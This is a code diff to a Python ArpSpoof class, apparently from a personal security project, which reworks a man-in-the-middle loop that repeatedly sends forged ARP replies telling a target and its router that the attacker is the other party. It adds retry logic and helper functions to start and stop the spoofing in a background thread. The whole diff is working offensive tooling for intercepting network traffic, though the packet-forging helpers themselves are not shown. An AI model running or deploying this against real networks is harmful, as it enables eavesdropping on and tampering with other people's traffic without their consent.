@@ -20,19 +20,23 @@ class ArpSpoof:
 
     @staticmethod
     def man_in_the_middle(target_ip, router_ip, filepath, force_get_mac_address=False):
-        target_mac = ArpSpoof.get_mac(target_ip)
-        router_mac = ArpSpoof.get_mac(router_ip)
-        packets_sent = 0
         ArpSpoof.create_control_file(filepath)
-        while os.path.exists(filepath):
-            if force_get_mac_address:
-                target_mac = ArpSpoof.get_mac(target_ip)
-                router_mac = ArpSpoof.get_mac(router_ip)
-            ArpSpoof.spoof(target_ip, target_mac, router_ip)  # tell the router I am the target
-            ArpSpoof.spoof(router_ip, router_mac, target_ip)  # tell the target I am the router
-            packets_sent += 2
-            logging.debug(f"Packets sent: {packets_sent}")
-            time.sleep(1)
+        target_mac = None
+        router_mac = None
+        packets_sent = 0
+        try:
+            while os.path.exists(filepath):
+                if force_get_mac_address or not target_mac or not router_mac:
+                    target_mac = ArpSpoof.get_mac(target_ip)
+                    router_mac = ArpSpoof.get_mac(router_ip)
+                ArpSpoof.spoof(target_ip, target_mac, router_ip)  # tell the router I am the target
+                ArpSpoof.spoof(router_ip, router_mac, target_ip)  # tell the target I am the router
+                packets_sent += 2
+                logging.info(f"Packets sent: {packets_sent}")
+                time.sleep(1)
+        except Exception as e:
+            print(f'ERROR in mim with ip {target_ip} : ' + str(e))
+            ArpSpoof.man_in_the_middle(target_ip, router_ip, filepath, force_get_mac_address=False)
 
     @staticmethod
     def create_control_file(filepath):
@@ -45,6 +49,22 @@ class ArpSpoof:
             os.remove(filepath)
             logging.info(f"Control file {filepath} deleted.")
 
+    @staticmethod
+    def main_mim(router_ip, target_ip):
+        os.makedirs('threads', exist_ok=True)
+        name_watcher = f"{target_ip}_arp_spoof"
+        control_file_path = f"threads/{name_watcher}_control"
+
+        thread = threading.Thread(
+            target=ArpSpoof.man_in_the_middle, args=(
+                target_ip, router_ip, control_file_path, 'false'), name="MITMThread")
+        thread.start()
+
+    @staticmethod
+    def stop_mim(target_ip):
+        name_watcher = f"{target_ip}_arp_spoof"
+        control_file_path = f"threads/{name_watcher}_control"
+        ArpSpoof.delete_control_file(control_file_path)
 
 # Example usage
 if __name__ == "__main__":
@@ -53,10 +73,7 @@ if __name__ == "__main__":
 
     os.makedirs('threads', exist_ok=True)
     name_watcher = f"{target_ip}_arp_spoof"
-    control_file_path = f"/mnt/hgfs/cybsec/src/arp_spoof/threads/{name_watcher}_control"
+    control_file_path = f"threads/{name_watcher}_control"
 
     thread = threading.Thread(target=ArpSpoof.man_in_the_middle, args=(target_ip, router_ip, control_file_path, 'false'), name="MITMThread")
     thread.start()
-
-    print("hello world")
-    # Stop the watcher after some time (e.g., 30 seconds)
